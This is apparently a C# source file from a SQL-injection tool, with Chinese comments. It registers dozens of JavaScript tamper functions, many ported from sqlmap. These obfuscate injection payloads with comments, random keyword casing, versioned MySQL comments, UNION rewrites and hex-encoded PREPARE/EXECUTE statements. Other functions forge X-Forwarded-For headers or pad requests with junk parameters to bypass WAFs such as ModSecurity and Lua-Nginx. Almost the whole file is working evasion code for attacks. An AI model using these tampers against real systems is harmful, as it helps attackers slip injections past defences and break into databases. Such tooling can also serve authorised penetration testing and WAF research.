            Reg("substring2leftright", "PG的SUBSTRING(x FROM a FOR 1)→LEFT/RIGHT组合（绕SUBSTRING过滤）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var m = /SUBSTRING\((.+?)\s+FROM[^)]+(\d+)[^)]+FOR[^)]+1\)/.exec(payload);
    if (!m) { return payload; }
    var pos = parseInt(m[2], 10);
    var rep = pos === 1 ? 'LEFT(' + m[1] + ',1)' : 'LEFT(RIGHT(' + m[1] + ',' + (1 - pos) + '),1)';
    return payload.split(m[0]).join(rep);
}
""");
            Reg("plus2concat", "+号字符串拼接→CONCAT(a,b,..)（括号深度0处的+，MSSQL 2012+）",
                PlusConcatJs(false));
            Reg("plus2fnconcat", "+号字符串拼接→{fn CONCAT(a,b)}嵌套（ODBC函数，MSSQL 2008+）",
                PlusConcatJs(true));

            //---- 空格/注释混淆类 ----
            Reg("space2comment", "空格→内联注释/**/（引号感知）", SpaceWalkerJs("/**/"));
            Reg("space2morecomment", "空格→注释/**_**/（引号感知）", SpaceWalkerJs("/**_**/"));
            Reg("space2plus", "空格→加号+（引号感知，查询串中等价空格）", SpaceWalkerJs("+"));
            Reg("space2dash", "空格→--随机串%0A（引号感知，遇#/-- 截断，MSSQL/SQLite）",
                RandStrFn + "\n" + CommentWalkerJs("'--' + randStr() + '%0A'"));
            Reg("space2hash", "空格→%23随机串%0A（引号感知，遇#/-- 截断，MySQL）",
                RandStrFn + "\n" + CommentWalkerJs("'%23' + randStr() + '%0A'"));
            Reg("space2mssqlhash", "空格→%23%0A（引号感知，遇#/-- 截断，MySQL单行注释）",
                CommentWalkerJs("'%23%0A'"));
            Reg("space2mysqldash", "空格→--%0A（引号感知，遇#/-- 截断，MySQL/MSSQL）",
                CommentWalkerJs("'--%0A'"));
            Reg("space2randomblank", "空格→随机空白符%09/%0A/%0C/%0D（引号感知）",
                BlankWalkerJs("'%09', '%0A', '%0C', '%0D'", false));
            Reg("space2mysqlblank", "空格→随机MySQL空白符%09/%0A/%0C/%0D/%0B/%A0（引号感知）",
                BlankWalkerJs("'%09', '%0A', '%0C', '%0D', '%0B', '%A0'", false));
            Reg("space2mssqlblank", "空格→随机MSSQL控制符%01-%0F（引号感知，注释段后不含%0A）",
                BlankWalkerJs("'%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A'", true));
            Reg("space2morehash", "关键字后与引号外空格→%23随机串%0A（MySQL>=5.1.13）",
                SqlKeywords.JsDecl + RandStrFn + """
function tamper(payload){
    if (!payload) { return ''; }
    payload = payload.replace(/(?:^|(?<=\W))([A-Za-z_]+)(?=[^\w(]|$)/g, function(m, w){
        var r = randStr();
        return KW.has(w.toUpperCase()) && !KW_NS.has(w.toUpperCase()) ? m.replace(w, w + '%23' + r + '%0A') : m;
    });
    var retVal = '', quote = false, dquote = false;
    for (var i = 0; i < payload.length; i++){
        var c = payload.charAt(i);
        if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
        else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
        if (!quote && !dquote){
            if (/\s/.test(c)){ retVal += '%23' + randStr() + '%0A'; }
            else if (c === '#' || payload.substr(i, 3) === '-- '){ retVal += payload.substring(i); break; }
            else { retVal += c; }
        } else { retVal += c; }
    }
    return retVal;
}
""");
            Reg("multiplespaces", "SQL关键字前后加1~4个随机空格（关键字表感知）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    function sp(){ return ' '.repeat(1 + Math.floor(Math.random() * 4)); }
    var retVal = payload, seen = [], re = /\b[A-Za-z_]+\b/g, m;
    while ((m = re.exec(payload)) !== null){
        var w = m[0];
        if (KW.has(w.toUpperCase()) && seen.indexOf(w) < 0){ seen.push(w); }
    }
    for (var k = 0; k < seen.length; k++){
        var word = seen[k];
        retVal = retVal.replace(new RegExp('(?<=\\W)' + word + '(?=[^A-Za-z_(]|$)', 'g'), sp() + word + sp());
        retVal = retVal.replace(new RegExp('(?<=\\W)' + word + '(?=[(])', 'g'), sp() + word);
    }
    return retVal;
}
""");
            Reg("randomcomments", "SQL关键字内部随机插入内联注释（SELECT→S/**/ELECT，关键字表感知）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload, re = /\b[A-Za-z_]+\b/g, m;
    while ((m = re.exec(payload)) !== null){
        var w = m[0];
        if (w.length < 2 || !KW.has(w.toUpperCase())){ continue; }
        var out = w.charAt(0);
        for (var i = 1; i < w.length - 1; i++){
            out += (Math.random() < 0.5 ? '/**/' : '') + w.charAt(i);
        }
        out += w.charAt(w.length - 1);
        if (out.indexOf('/**/') < 0){
            var idx = 1 + Math.floor(Math.random() * (w.length - 1));
            out = w.substring(0, idx) + '/**/' + w.substring(idx);
        }
        retVal = retVal.replace(new RegExp('\\b' + w + '\\b', 'g'), function(){ return out; });
    }
    return retVal;
}
""");

            //---- 关键字表感知类（KW=sqlmap keywords.txt 1018个，KW_NS=IGNORE_SPACE_AFFECTED）----
            Reg("uppercase", "SQL关键字全大写（sqlmap关键字表感知）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload, re = /[A-Za-z_]+/g, m;
    while ((m = re.exec(retVal)) !== null){
        if (KW.has(m[0].toUpperCase())){ retVal = retVal.split(m[0]).join(m[0].toUpperCase()); }
    }
    return retVal;
}
""");
            Reg("lowercase", "SQL关键字全小写（sqlmap关键字表感知）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload, re = /\b[A-Za-z_]+\b/g, m;
    while ((m = re.exec(retVal)) !== null){
        if (KW.has(m[0].toUpperCase())){ retVal = retVal.split(m[0]).join(m[0].toLowerCase()); }
    }
    return retVal;
}
""");
            Reg("randomcase", "关键字随机大小写（关键字表感知；反引号/引号/方括号包裹的标识符不动）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload, re = /\b[A-Za-z_]{2,}\b/g, m;
    while ((m = re.exec(payload)) !== null){
        var word = m[0];
        var quoted = new RegExp('[`"\'\\[]' + word + '[`"\'\\]]', 'i').test(retVal);
        if ((!quoted && KW.has(word.toUpperCase())) || payload.indexOf(word + '(') >= 0){
            var out;
            do {
                out = '';
                for (var i = 0; i < word.length; i++){
                    out += Math.random() < 0.5 ? word.charAt(i).toUpperCase() : word.charAt(i).toLowerCase();
                }
            } while (out.length > 1 && (out === out.toLowerCase() || out === out.toUpperCase()));
            retVal = retVal.replace(new RegExp('\\b' + word + '\\b', 'g'), function(){ return out; });
        }
    }
    return retVal;
}
""");
            Reg("versionedkeywords", "非函数MySQL关键字包裹版本注释/*!kw*/（MySQL 4.0+）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload.replace(/(?:^|(?<=\W))([A-Za-z_]+)(?=[^\w(]|$)/g, function(m, w){
        return KW.has(w.toUpperCase()) ? m.replace(w, '/*!' + w + '*/') : m;
    });
    return retVal.split(' /*!').join('/*!').split('*/ ').join('*/');
}
""");
            Reg("versionedmorekeywords", "MySQL关键字包裹版本注释/*!kw*/（含函数，MySQL>=5.1.13）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload.replace(/(?:^|(?<=\W))([A-Za-z_]+)(?=\W|$)/g, function(m, w){
        return KW.has(w.toUpperCase()) && !KW_NS.has(w.toUpperCase()) ? m.replace(w, '/*!' + w + '*/') : m;
    });
    return retVal.split(' /*!').join('/*!').split('*/ ').join('*/');
}
""");
            Reg("halfversionedmorekeywords", "MySQL关键字加半版本注释前缀/*!0kw（MySQL<5.1）",
                SqlKeywords.JsDecl + """
function tamper(payload){
    if (!payload) { return payload; }
    var retVal = payload.replace(/(?:^|(?<=\W))([A-Za-z_]+)(?=\W|$)/g, function(m, w){
        return KW.has(w.toUpperCase()) && !KW_NS.has(w.toUpperCase()) ? m.replace(w, '/*!0' + w) : m;
    });
    return retVal.split(' /*!0').join('/*!0');
}
""");

            //---- ModSecurity 专绕 ----
            Reg("modsecurityversioned", "首空格后整段包裹/*!30xxx..*/版本注释（注释尾保留，MySQL/ModSecurity）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var postfix = '';
    var cuts = ['#', '--', '/*'];
    for (var k = 0; k < cuts.length; k++){
        var idx = payload.indexOf(cuts[k]);
        if (idx >= 0){ postfix = payload.substring(idx); payload = payload.substring(0, idx); break; }
    }
    var sp = payload.indexOf(' ');
    if (sp < 0) { return payload; }
    var rnd = String(Math.floor(Math.random() * 1000)).padStart(3, '0');
    return payload.substring(0, sp) + ' /*!30' + rnd + payload.substring(sp + 1) + '*/' + postfix;
}
""");
            Reg("modsecurityzeroversioned", "首空格后整段包裹/*!00000..*/零版本注释（注释尾保留，MySQL/ModSecurity）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var postfix = '';
    var cuts = ['#', '--', '/*'];
    for (var k = 0; k < cuts.length; k++){
        var idx = payload.indexOf(cuts[k]);
        if (idx >= 0){ postfix = payload.substring(idx); payload = payload.substring(0, idx); break; }
    }
    var sp = payload.indexOf(' ');
    if (sp < 0) { return payload; }
    return payload.substring(0, sp) + ' /*!00000' + payload.substring(sp + 1) + '*/' + postfix;
}
""");
            Reg("odbcbrace", "前导数字加{x !0}*前缀（ODBC转义序列，绕libinjection/CRS 942360，MySQL/MariaDB）",
                "function tamper(payload){ return payload ? payload.replace(/^([+-]?\\d+)(?![\\w.])/, '{x !0}*$1') : payload; }");
            Reg("oraclequote", "单引号字符串→Oracle q-quote（q'[..]'，自动选首个未出现的定界符）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var delims = [['[', ']'], ['{', '}'], ['(', ')'], ['<', '>'], ['!', '!'], ['|', '|'], ['#', '#']];
    return payload.replace(/'([^']*)'/g, function(m, v){
        for (var k = 0; k < delims.length; k++){
            if (v.indexOf(delims[k][0]) < 0 && v.indexOf(delims[k][1]) < 0){
                return "q'" + delims[k][0] + v + delims[k][1] + "'";
            }
        }
        return m;
    });
}
""");

            //---- UNION 结构重写 ----
            Reg("uniontable", "UNION SELECT * FROM t→UNION TABLE t（无SELECT/FROM关键字，MySQL>=8.0.19）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    var tailOk = function(t){ return !t || /^(?:ORDER\s+BY|LIMIT)\b/i.test(t); };
    var retVal = payload.replace(/(UNION)(\s+ALL)?\s+SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([\s\S]*?)(?=(?:--|#|\/\*)|$)/gi,
        function(m, union, all, table, tail){
            tail = (tail || '').trim();
            if (tail && !tailOk(tail)) { return m; }
            return union + (all || '') + ' TABLE ' + table + (tail ? ' ' + tail : '');
        });
    retVal = retVal.replace(/\(\s*SELECT\s+\*\s+FROM\s+(`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)([^()]*?)\s*\)/gi,
        function(m, table, tail){
            tail = (tail || '').trim();
            if (tail && !tailOk(tail)) { return m; }
            return '(TABLE ' + table + (tail ? ' ' + tail : '') + ')';
        });
    return retVal;
}
""");
            Reg("unionvalues", "UNION SELECT cols→UNION VALUES (cols)（无SELECT关键字，MariaDB/PG/SQLite等）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    return payload.replace(/(UNION)(\s+ALL)?\s+SELECT\s+(.+?)(?=(?:--|#|\/\*)|$)/gi,
        function(m, union, all, columns){
            columns = columns.replace(/\s+$/, '');
            if (/\bFROM\b/i.test(columns)) { return m; }
            return union + (all || '') + ' VALUES (' + columns + ')';
        });
}
""");
            Reg("unionvaluesrow", "UNION SELECT cols→UNION VALUES ROW(cols)（MySQL>=8.0.19）",
                """
function tamper(payload){
    if (!payload) { return payload; }
    return payload.replace(/(UNION)(\s+ALL)?\s+SELECT\s+(.+?)(?=(?:--|#|\/\*)|$)/gi,
        function(m, union, all, columns){
            columns = columns.replace(/\s+$/, '');
            if (/\bFROM\b/i.test(columns)) { return m; }
            return union + (all || '') + ' VALUES ROW(' + columns + ')';
        });
}
""");

            //---- 报文级（sqlmap中改HTTP头/前置参数的tamper）----
            Reg("varnish", "追加X-originating-IP: 127.0.0.1头（绕Varnish防火墙）",
                """
function tamper(request){
    if (/^X-originating-IP:/im.test(request)){
        return request.replace(/^X-originating-IP:[^\r\n]*/im, 'X-originating-IP: 127.0.0.1');
    }
    return request.replace(/\r\n\r\n/, '\r\nX-originating-IP: 127.0.0.1\r\n\r\n');
}
""", ScriptScope.Request);
            Reg("xforwardedfor", "追加X-Forwarded-For等5个随机IP头+Via头（绕基于IP的WAF/限流）",
                """
function rip(){ return (1 + Math.floor(Math.random() * 254)) + '.' + Math.floor(Math.random() * 256) + '.' + Math.floor(Math.random() * 256) + '.' + (1 + Math.floor(Math.random() * 254)); }
function tamper(request){
    var heads = 'X-Forwarded-For: ' + rip() + '\r\nX-Client-Ip: ' + rip() + '\r\nX-Real-Ip: ' + rip()
        + '\r\nCF-Connecting-IP: ' + rip() + '\r\nTrue-Client-IP: ' + rip() + '\r\nVia: 1.1 Chrome-Compression-Proxy';
    return request.replace(/\r\n\r\n/, '\r\n' + heads + '\r\n\r\n');
}
""", ScriptScope.Request);
            Reg("luanginx", "前置500个垃圾参数（Lua-Nginx WAF参数上限绕过，Cloudflare等）",
                LuaNginxJs(500), ScriptScope.Request);
            Reg("luanginxmore", "前置4194304个垃圾参数（Lua-Nginx WAF极限绕过；报文巨大慎用）",
                LuaNginxJs(4194304), ScriptScope.Request);

            //---- 本工具自研（堆叠注入语句级重写，非sqlmap）----
            Reg("hexprepare", "整段SQL转hex套MySQL预编译执行（;SET @s=0x..;PREPARE..;EXECUTE..，堆叠通道专用，逃逸select等关键字整串过滤）",
                Utf8Fn + """
function tamper(payload){
    var bin = utf8bin(payload);
    var out = ';SET @s=0x';
    for (var i = 0; i < bin.length; i++){
        out += bin.charCodeAt(i).toString(16).padStart(2, '0');
    }
    return out + ';PREPARE stmt FROM @s;EXECUTE stmt;';
}
""");
            Reg("hexpreparechar", "hexprepare的char()变体（0x被过滤时改用CONCAT(CHAR(..),..)拼接，堆叠通道专用）",
                Utf8Fn + """
function tamper(payload){
    var bin = utf8bin(payload);
    var parts = [];
    for (var i = 0; i < bin.length; i++){
        parts.push('CHAR(' + bin.charCodeAt(i) + ')');
    }
    return ';SET @s=CONCAT(' + parts.join(',') + ');PREPARE stmt FROM @s;EXECUTE stmt;';
}
""");

            return d;
        }

        //======== JS 生成器（参数化变体共用骨架） ========

        /// <summary>ifnull2ifisnull / ifnull2casewhenisnull 的JS骨架（平衡括号+引号感知walker，与sqlmap一致）</summary>
        private static string IfNullWalkerJs(string buildStmt)
        {
            return """
function tamper(payload){
    if (!payload || payload.indexOf('IFNULL(') < 0) { return payload; }
    while (payload.indexOf('IFNULL(') > -1){
        var index = payload.indexOf('IFNULL(');
        var depth = 1, comma = -1, end = -1, quote = false, dquote = false;
        for (var i = index + 7; i < payload.length; i++){
            var c = payload.charAt(i);
            if (c === "'" && payload.charAt(i - 1) !== '\\'){ quote = !quote; }
            else if (c === '"' && payload.charAt(i - 1) !== '\\'){ dquote = !dquote; }
            if (!quote && !dquote){
                if (depth === 1 && c === ','){ comma = i; }
                else if (depth === 1 && c === ')'){ end = i; break; }
                else if (c === '('){ depth++; }
                else if (c === ')'){ depth--; }
            }
        }
        if (comma > 0 && end > 0){
            var a = payload.substring(index + 7, comma);
            var b = payload.substring(comma + 1, end).replace(/^\s+/, '');
            var newVal;
            BUILD
            payload = payload.substring(0, index) + newVal + payload.substring(end + 1);
        } else { break; }
    }
    return payload;
}
""".Replace("BUILD", buildStmt);
        }

        /// <summary>plus2concat / plus2fnconcat 的JS骨架（括号深度0处的+拆分，与sqlmap zeroDepthSearch一致）</summary>
        private static string PlusConcatJs(bool fnConcat)
        {
            string wrap = fnConcat
                ? """
    var replacement = parts[0];
    for (var k = 1; k < parts.length; k++){
        replacement = '{fn CONCAT(' + replacement + ',' + parts[k] + ')}';
    }
"""
                : "    var replacement = 'CONCAT(' + parts.join(',') + ')';";
            return """
function zeroDepth(s, ch){
    var idx = [], depth = 0;
    for (var i = 0; i < s.length; i++){
        var c = s.charAt(i);
        if (c === '('){ depth++; }
        else if (c === ')'){ depth--; }
        else if (c === ch && depth === 0){ idx.push(i); }
    }
    return idx;
}
function tamper(payload){
    if (!payload) { return payload; }
    var m = /('[^']+'|CHAR\(\d+\))\+.*(?<=\+)('[^']+'|CHAR\(\d+\))/.exec(payload);
    if (!m) { return payload; }
    var part = m[0];
    var parts = [], last = 0;
    var idxs = zeroDepth(part, '+');
    for (var k = 0; k < idxs.length; k++){
        parts.push(part.substring(last, idxs[k])); last = idxs[k];
    }
    parts.push(part.substring(last));
    parts = parts.map(function(p){ return p.replace(/^\+|\+$/g, ''); });
WRAP
    return payload.split(part).join(replacement);
}
""".Replace("WRAP", wrap);
        }

        /// <summary>luanginx / luanginxmore 的JS骨架（报文级：query与body前置N个垃圾参数）</summary>
        private static string LuaNginxJs(int count)
        {
            return """
function randPairs(n){
    var chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    var parts = [];
    for (var i = 0; i < n; i++){
        parts.push(chars.charAt(Math.floor(Math.random() * chars.length)) + chars.charAt(Math.floor(Math.random() * chars.length)) + '=');
    }
    return parts.join('&');
}
function tamper(request){
    var junk = randPairs(COUNT);
    var headEnd = request.indexOf('\r\n\r\n');
    var head = headEnd < 0 ? request : request.substring(0, headEnd);
    var body = headEnd < 0 ? null : request.substring(headEnd + 4);
    var nl = head.indexOf('\r\n');
    var line1 = nl < 0 ? head : head.substring(0, nl);
    var headers = nl < 0 ? '' : head.substring(nl);
    var sp = line1.lastIndexOf(' HTTP/');
    var url = sp < 0 ? line1 : line1.substring(0, sp);
    var ver = sp < 0 ? '' : line1.substring(sp);
    if (url.indexOf('?') >= 0){ url += '&' + junk; } else { url += '?' + junk; }
    var out = url + ver + headers;
    if (body === null){ return out; }
    body = body.length > 0 ? junk + '&' + body : junk;
    var blen = unescape(encodeURIComponent(body)).length;
    if (/^Content-Length:/im.test(out)){
        out = out.replace(/^Content-Length:[^\r\n]*/im, 'Content-Length: ' + blen);
    } else if (body.length > 0){
        out += '\r\nContent-Length: ' + blen;
    }
    return out + '\r\n\r\n' + body;
}
""".Replace("COUNT", count.ToString());
        }
    }
}

